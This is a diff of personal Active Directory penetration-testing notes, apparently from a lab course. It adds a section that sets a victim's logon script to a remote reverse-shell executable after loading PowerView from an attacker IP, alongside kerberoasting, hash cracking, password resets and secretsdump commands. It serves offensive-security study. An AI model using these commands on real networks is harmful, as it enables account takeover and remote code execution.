@@ -532,7 +532,7 @@ runas /user:corp\jen powershell.exe
 * Add target DC and generic domain to /etc/hosts
   *
 
-      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+      <figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * IMPT: THE SOURCE OF THE KERBEROS REQUEST MATTERS!!! --> SET UP [LIGOLO-NG!](../post-exploitation/port-forwarding-pivoting.md#ligolo-ng)
@@ -619,7 +619,7 @@ runas /user:corp\jen powershell.exe
 * Can add new access rights like GenericAll, GenericWrite, or even DCSync
 *
 
-    <figure><img src="../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 * Adding GenericAll rights:
   * ```powershell
     # Might need to migrate to sqlsvc process using metasploit
@@ -643,6 +643,23 @@ runas /user:corp\jen powershell.exe
 
 <summary>Exploiting GenericWrite on Another User</summary>
 
+### Set Login Script for victim user
+
+* Generate using [csharp\_shellcode python script](../good-exploit-code/c-shellcode-runner.md#process-injector-example)
+
+```powershell
+# Load PowerView
+iex (new-object net.webclient).downloadstring('http://192.168.45.218/PowerView.ps1')
+
+# Setup SMB server
+sudo python3 /usr/local/bin/smbserver.py share . -smb2support
+
+# Logon Script to point to rev shell exe
+Set-DomainObject -Identity SHAUN.BLAKE -Set @{'scriptpath'='\\192.168.45.218\share\ProcessInjection.exe'}
+```
+
+### Cracking User's Password
+
 * Able to set a service principal name and kerberoast that account
   *   ```powershell
       ./targetedKerberoast.py --dc-ip '192.168.170.70' -v -d 'prod.corp1.com' -u 'offsec' -p 'lab'
@@ -650,9 +667,11 @@ runas /user:corp\jen powershell.exe
 
 
 * Obtain TGS-REP hash
-  * ```bash
-    hashcat -m 13100 hash.txt rockyou.txt
-    ```
+  *   ```bash
+      hashcat -m 13100 hash.txt rockyou.txt
+      ```
+
+
 
 </details>
 
@@ -660,7 +679,7 @@ runas /user:corp\jen powershell.exe
 
 <summary>Exploiting GenericWrite on Computer Object</summary>
 
-![](<../.gitbook/assets/image (5) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (5) (1) (1) (1) (1).png>)
 
 * Enumerating permissions assigned to current user
   *   ```powershell
@@ -727,7 +746,7 @@ Currently, pwned adminwebsvc@final.com --> part of webadmins grp --> able to For
 
 ```powershell
 iex(new-object net.webclient).downloadstring('http://192.168.45.160/PowerView.ps1')	
-$NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+$NewPassword = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force
 Set-DomainUserPassword -Identity Nina -AccountPassword $NewPassword
 ```
 
@@ -791,10 +810,10 @@ nslookup appsrv01
     * OR Krbrelayx attack on unconstrained delegation
       *
 
-          <figure><img src="../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+          <figure><img src="../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
-      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png>)
+      * Dump the NTLM hashes for Files01 computer account (FILES01$)![](<../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png>)
         *   ```powershell
             impacket-secretsdump CORP/adam:4Toolsfigure3@192.168.101.104
             ```
@@ -870,7 +889,7 @@ nslookup appsrv01
 * S4U2Self --> Allows a service to request Kerberos TGS for any user, including domain admin, without needing their passwords or hash
 * S4U2Proxy --> Allows a service to take a TGS from S4U2Self and exchange it for a TGS to a backend service
 
-![](<../.gitbook/assets/image (11) (1).png>)
+![](<../.gitbook/assets/image (11) (1) (1).png>)
 
 ## Enumeration
 
@@ -878,7 +897,7 @@ nslookup appsrv01
     </strong><strong>Get-DomainUser -TrustedToAuth
     </strong></code></pre>
 
-    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Contained delegation is configured on IISSvc and it is only allowed to MSSQLSvc
@@ -900,7 +919,7 @@ nslookup appsrv01
 
     * Enumerate the user logged in to MSSQL --> logged in as the domain admin
 
-    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -919,7 +938,7 @@ nslookup appsrv01
 
 ## Exploitation 3
 
-![](<../.gitbook/assets/image (3) (1) (1) (1).png>)
+![](<../.gitbook/assets/image (3) (1) (1) (1) (1).png>)
 
 * Obtain a Ticket Granting Ticket (TGT) for the Service Account
   *   ```powershell
@@ -1153,12 +1172,12 @@ setspn -T corp2.com -Q MSSQLSvc/*
 
 *   Login to the rdc01.corp1.com mssql server
 
-    <figure><img src="../.gitbook/assets/image (7) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (7) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 *   Enumeration for [linked sql servers](../services/1433-mssql.md#linked-sql-servers)
 
-    <figure><img src="../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
+    <figure><img src="../.gitbook/assets/image (9) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 * Obtaining Reverse shell from dc01.corp2.com
